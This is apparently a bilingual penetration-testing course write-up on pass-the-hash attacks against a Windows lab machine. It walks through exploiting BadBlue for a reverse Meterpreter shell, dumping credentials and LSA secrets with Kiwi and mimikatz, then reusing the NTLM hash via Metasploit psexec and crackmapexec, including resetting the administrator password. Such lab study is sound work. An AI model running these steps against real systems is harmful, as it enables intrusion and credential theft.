---
layout: post
title: "Pass-The-Hash Attacks"
date: "2022-10-09"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - System/Host Based Attacks
---

# Pass-The-Hash Attacks
## Pass-The-Hash
Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately **via SMB**.

We can use multiple tools to facilitate a Pass-The-Hash attack:
* Metasploit PsExec module
* Crackmapexec

This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.

# 传递哈希攻击
## 传递哈希
Pass-the-hash 是一种利用技术，涉及捕获或获取 NTLM 哈希或明文密码，并利用它们合法地与目标进行身份验证。

我们可以使用多种工具来促进 Pass-The-Hash 攻击：
* Metasploit PsExec 模块
* Crackmapexec

这种技术将允许我们通过合法凭证获得对目标系统的访问权，而不是通过服务利用获得访问权。

The vulnerable service you've exploited in order to gain access to the target in the first place is patched, or that service completely disabled, or a firewall rule has been enabled therefore preventing you from connecting to the particular port or from exploiting that service. What do you do then? If you got actual administrator hash, you can use the same hash to gain access to the target system in regardless of wether or not the vulnerable service has been patched. And this is a form of persistence that will help you maintain access to the target system even if the original vulerable service has been patched or has been disabled.

# Demo: Pass-The-Hash Attacks（演示：传递哈希攻击）
```
Target IP Address: 10.2.28.132
```

```
service postgresql start && msfconsole

search badblue
use 1
set RHOSTS 10.2.28.132
exploit
```

```
meterpreter > pgrep lsass
780
meterpreter > migrate 780
meterpreter > getuid
```

To get administrator NTLM crdentials.

```
meterpreter > load kiwi
meterpreter > lsa_dump_sam
```

How to perform Pass-The-Hash attack with the PsExec Metasploit module. In order to use this module, you will require LM hash in addition to the NTLM or NT hash.

A quick way of getting that is typing in `hashdump`.

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
```

LM hash is same for every user. We want to copy this particular hash as that particular Metasploit PsExec module requires you to specify the LM hash in addtion to the NT hash itself.

```
Administrator:SID:LM hash:NTML or NT hash:::
```

`Ctrl+Z` put this meterpreter session into background.

This moudle allows you to set up domian if the target system is a part of domain. SMBPass here you can specify clear-text credentials or the actual hash.

```
search psexec
use exploit/windows/smb/psexec
show options
sessions
set LPORT 4422
set RHOSTS 10.2.28.132
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
exploit
sessions
```

```
set target Command
exploit
sessions
```

```
set target Native\ upload
exploit
meterpreter > sysinfo
meterpreter > getuid
meterpreter > exit
sessions
sessions -K
show options
exploit
meterpreter > sysinfo
```

Utilize other tool like PsExec or PsExec Python script or Crackmapexec.

`-H`: NTML hash.

```
 crackmapexec smb 10.2.28.132 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d"
 crackmapexec smb 10.2.28.132 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "ipconfig"
 crackmapexec smb 10.2.28.132 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "whoami"
 crackmapexec smb 10.2.28.132 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "net user administrator password123"
 crackmapexec smb 10.2.28.132 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "net user"
```

# Windows：Meterpreter：Kiwi 扩展
## 概述
为您提供了一个 Kali GUI 机器和一个运行易受攻击应用程序的目标机器。目标机器的 IP 地址在 Kali 机器桌面 (/root/Desktop/target) 上名为 target 的文本文件中提供。  
你的任务是使用 Kali 机器上可用的工具对应用程序进行指纹识别，然后使用适当的 Metasploit 模块利用机器。然后，使用meterpreter Kiwi 插件从目标机器中提取敏感数据。

目标：利用应用程序并找到所有标志。
* 查找管理员和学生用户 NTLM 哈希。
* 转储 LSA 机密以查找 Syskey

说明：
* 你的 Kali 机器有一个 IP 地址为 10.10.XY 的接口 运行 “ip addr” 可以知道 X 和 Y 的值。 
* 目标机器的 IP 地址在文件 “/root/Desktop/target” 中提到* 不要攻击位于 IP 地址 192.VW1 和 10.10.X.1 的网关

## 我自己的思路
```
Target IP Address : 10.0.28.37
```

```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.21.3  netmask 255.255.255.0  broadcast 10.10.21.255
        ether 02:42:0a:0a:15:03  txqueuelen 0  (Ethernet)
```

```
root@attackdefense:~# nmap 10.0.28.37
Starting Nmap 7.91 ( https://nmap.org ) at 2022-10-09 16:02 IST
Nmap scan report for 10.0.28.37
Host is up (0.0035s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
```

The target is running `BadBlue httpd 2.7` application.

```
root@attackdefense:~# nmap -sV -p 80 10.0.28.37
Starting Nmap 7.91 ( https://nmap.org ) at 2022-10-09 16:03 IST
Nmap scan report for 10.0.28.37
Host is up (0.0031s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

```
msf6 > search badblue

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/badblue_passthru

msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > set RHOSTS 10.0.28.37
RHOSTS => 10.0.28.37
msf6 exploit(windows/http/badblue_passthru) > exploit

[*] Started reverse TCP handler on 10.10.21.3:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.0.28.37
[*] Meterpreter session 1 opened (10.10.21.3:4444 -> 10.0.28.37:50065) at 2022-10-09 16:08:33 +0530

meterpreter > 

```

```
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > pgrep lsass
788
meterpreter > migrate 788
[*] Migrating from 3216 to 788...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Administrator's NTLM hash is `e3c61a68f1b89ee6c8ba9507378dc88d`。

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain         NTLM                              SHA1
--------       ------         ----                              ----
Administrator  ATTACKDEFENSE  e3c61a68f1b89ee6c8ba9507378dc88d  fa62275e30d286c09d30d8fece82664eb34323ef

wdigest credentials
===================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
ATTACKDEFENSE$  WORKGROUP      (null)
Administrator   ATTACKDEFENSE  (null)

kerberos credentials
====================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
Administrator   ATTACKDEFENSE  (null)
attackdefense$  WORKGROUP      (null)

```

SAM database is encrypted with `Syskey`, we also get the SAMKey by using `lsa_dump_sam`.

```
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b
```

student's NTLM hash is `bd4ca1fbe028f3c5066467a7f6a73b0b`.

```
meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326

Local name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )
Domain name : WORKGROUP

Policy subsystem is : 1.18
LSA Key(s) : 1, default {47980b9c-8bd1-89c9-bfb5-0c4fca25e625}
  [00] {47980b9c-8bd1-89c9-bfb5-0c4fca25e625} 247e7be223db5e50291fc0fcec276ff8236c32a8a6183c5a0d0b6b044590ce06

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 34 5e 65 80 f9 04 a4 8c a5 0e 6c 74 6c d2 c3 b8 8e 7a ca c3 a3 3b 0e 6e 0a 64 f3 12 fc c7 92 67 a3 2f d5 d1 e4 41 33 ac 
    full: 345e6580f904a48ca50e6c746cd2c3b88e7acac3a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
    m/u : 345e6580f904a48ca50e6c746cd2c3b88e7acac3 / a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
old/hex : 01 00 00 00 c1 3a 28 e3 94 7b 64 5d 94 29 b4 c9 1c 9b 0c b1 b6 5a aa 2c 34 4d ee ed 86 74 0f 12 25 37 8c 38 69 b3 b4 53 b6 37 86 44 
    full: c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c344deeed86740f1225378c3869b3b453b6378644
    m/u : c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c / 344deeed86740f1225378c3869b3b453b6378644

Secret  : NL$KM
cur/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 
old/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 

```

```
meterpreter > pwd
C:\Temp
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
[*] uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.25 MiB of 1.25 MiB (100.0%): /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] uploaded   : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
meterpreter > shell
Process 6624 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Temp>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

```

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::sam
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ed1f5e64aad3727f03522bbddc080d77

* Primary:Kerberos-Newer-Keys *
    Default Salt : ATTACKDEFENSEAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f566d48c0c62f88d997e9e56b52eed1696aead09df3100982bcfc5920655da5d
      aes128_hmac       (4096) : bf0ca9e206e82ce481c818070bef0855
      des_cbc_md5       (4096) : 6d570d08df8979fe
    OldCredentials
      aes256_hmac       (4096) : 69d101a02f3f4648bf9875f10c1cd268d3f500c3253ab862222a9e1bb3740247
      aes128_hmac       (4096) : 3c3fd899f7f004ed44e9e48f868a5ddc
      des_cbc_md5       (4096) : 9b808fb9e0cbb3b5
    OlderCredentials
      aes256_hmac       (4096) : 4cbbe8ad8482ca76952b08cd9103ba91af35c9d8b21a3d49c332e072618a9fa9
      aes128_hmac       (4096) : b18addd75f8a2b106b262c7b5e517623
      des_cbc_md5       (4096) : 7fe0c2a15eb32fcd

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ATTACKDEFENSEAdministrator
    Credentials
      des_cbc_md5       : 6d570d08df8979fe
    OldCredentials
      des_cbc_md5       : 9b808fb9e0cbb3b5


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a1528cd40d99e5dfa9fa0809af998696

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
      des_cbc_md5       (4096) : ce9b2cabd55df4ce

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : ce9b2cabd55df4ce


RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b8e5edf45f3a42335f1f4906a24a08fe

* Primary:Kerberos-Newer-Keys *
    Default Salt : EC2AMAZ-R69684Tstudent
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : bab064fdaf62216a1577f1d5cd88e162f6962b4a421d199adf4c66b61ec6ac7c
      aes128_hmac       (4096) : 42bc1d17d1236d3afc09efbeba547d2c
      des_cbc_md5       (4096) : 1a975b02a7bf15d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EC2AMAZ-R69684Tstudent
    Credentials
      des_cbc_md5       : 1a975b02a7bf15d5
```

```
mimikatz # lsadump::secrets
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326

Local name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )
Domain name : WORKGROUP

Policy subsystem is : 1.18
LSA Key(s) : 1, default {47980b9c-8bd1-89c9-bfb5-0c4fca25e625}
  [00] {47980b9c-8bd1-89c9-bfb5-0c4fca25e625} 247e7be223db5e50291fc0fcec276ff8236c32a8a6183c5a0d0b6b044590ce06

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 34 5e 65 80 f9 04 a4 8c a5 0e 6c 74 6c d2 c3 b8 8e 7a ca c3 a3 3b 0e 6e 0a 64 f3 12 fc c7 92 67 a3 2f d5 d1 e4 41 33 ac 
    full: 345e6580f904a48ca50e6c746cd2c3b88e7acac3a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
    m/u : 345e6580f904a48ca50e6c746cd2c3b88e7acac3 / a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
old/hex : 01 00 00 00 c1 3a 28 e3 94 7b 64 5d 94 29 b4 c9 1c 9b 0c b1 b6 5a aa 2c 34 4d ee ed 86 74 0f 12 25 37 8c 38 69 b3 b4 53 b6 37 86 44 
    full: c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c344deeed86740f1225378c3869b3b453b6378644
    m/u : c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c / 344deeed86740f1225378c3869b3b453b6378644

Secret  : NL$KM
cur/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 
old/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2
```

Display logon passwords.

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 365885 (00000000:0005953d)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/9/2022 10:31:04 AM
SID               : S-1-5-90-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 365166 (00000000:0005926e)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 10/9/2022 10:31:04 AM
SID               : S-1-5-96-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 145776 (00000000:00023970)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ATTACKDEFENSE
Logon Server      : ATTACKDEFENSE
Logon Time        : 10/9/2022 10:30:19 AM
SID               : S-1-5-21-3688751335-3073641799-161370460-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * NTLM     : e3c61a68f1b89ee6c8ba9507378dc88d
	 * SHA1     : fa62275e30d286c09d30d8fece82664eb34323ef
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 10/9/2022 10:30:09 AM
SID               : S-1-5-20
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : attackdefense$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 29478 (00000000:00007326)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 10/9/2022 10:30:08 AM
SID               : S-1-5-96-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 28426 (00000000:00006f0a)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 10/9/2022 10:30:08 AM
SID               : 
	msv :	
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 365924 (00000000:00059564)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/9/2022 10:31:04 AM
SID               : S-1-5-90-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/9/2022 10:30:09 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 59926 (00000000:0000ea16)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/9/2022 10:30:09 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 59893 (00000000:0000e9f5)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/9/2022 10:30:09 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 29447 (00000000:00007307)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 10/9/2022 10:30:08 AM
SID               : S-1-5-96-0-0
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 10/9/2022 10:30:08 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : attackdefense$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

```

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```

```
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/badblue_passthru) > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1   auxiliary/admin/smb/psexec_ntdsgrab                           normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   2   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   3   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
   4   auxiliary/scanner/smb/psexec_loggedin_users                   normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   5   encoder/x86/service                                           manual     No     Register Service
   6   exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
   7   exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution
   8   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   9   exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   10  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution


Interact with a module by name or index. For example info 10, use 10 or use exploit/windows/smb/webexec

msf6 exploit(windows/http/badblue_passthru) > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

```

```
msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
msf6 exploit(windows/smb/psexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ATTACKDEFENSE  10.10.16.3:4444 -> 10.0.20.157:50027 (10.0.20.157)
```

```
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.0.20.157
RHOSTS => 10.0.20.157
msf6 exploit(windows/smb/psexec) > set LPORT 4422
LPORT => 4422
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
SMBPass => aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.16.3:4422 
[*] 10.0.20.157:445 - Connecting to the server...
[*] 10.0.20.157:445 - Authenticating to 10.0.20.157:445 as user 'Administrator'...
[*] 10.0.20.157:445 - Selecting PowerShell target
[*] 10.0.20.157:445 - Executing the payload...
[+] 10.0.20.157:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.0.20.157
[*] Meterpreter session 2 opened (10.10.16.3:4422 -> 10.0.20.157:50330) at 2022-10-09 17:43:32 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

```
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/smb/psexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ATTACKDEFENSE  10.10.16.3:4444 -> 10.0.20.157:50027 (10.0.20.157)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ATTACKDEFENSE  10.10.16.3:4422 -> 10.0.20.157:50330 (10.0.20.157)

msf6 exploit(windows/smb/psexec) > sessions -K
[*] Killing all sessions...
[*] 10.0.20.157 - Meterpreter session 1 closed.
[*] 10.0.20.157 - Meterpreter session 2 closed.
msf6 exploit(windows/smb/psexec) > sessions

Active sessions
===============

No active sessions.

```

```
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.16.3:4422 
[*] 10.0.20.157:445 - Connecting to the server...
[*] 10.0.20.157:445 - Authenticating to 10.0.20.157:445 as user 'Administrator'...
[*] 10.0.20.157:445 - Selecting PowerShell target
[*] 10.0.20.157:445 - Executing the payload...
[+] 10.0.20.157:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.0.20.157
[*] Meterpreter session 3 opened (10.10.16.3:4422 -> 10.0.20.157:50387) at 2022-10-09 17:48:20 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```
root@attackdefense:~# crackmapexec smb 10.0.20.157 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d"
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.0.20.157     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
SMB         10.0.20.157     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)
```

```
